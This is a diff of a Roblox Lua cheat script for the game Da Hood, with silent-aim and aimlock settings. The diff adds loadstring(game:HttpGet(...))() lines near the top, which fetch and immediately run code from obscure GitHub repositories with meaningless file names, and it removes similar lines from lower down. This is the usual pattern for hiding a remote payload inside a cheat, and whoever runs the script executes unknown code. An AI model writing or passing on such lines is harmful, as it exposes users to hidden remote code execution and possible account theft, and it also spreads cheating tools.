@@ -9,6 +9,8 @@ local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local CurrentCamera = Workspace.CurrentCamera
+loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/zz"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/bzzzzz"))()
 
 local DaHoodSettings = {
     SilentAim = true,
@@ -58,12 +60,6 @@ RunService:BindToRenderStep("AimLock", 0, function()
         CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
     end
     end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/zz"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/bzzz"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/bzzzzz"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/zzzpem"))()
-
 
 local denied_message = "Denied Goofy"
 local g
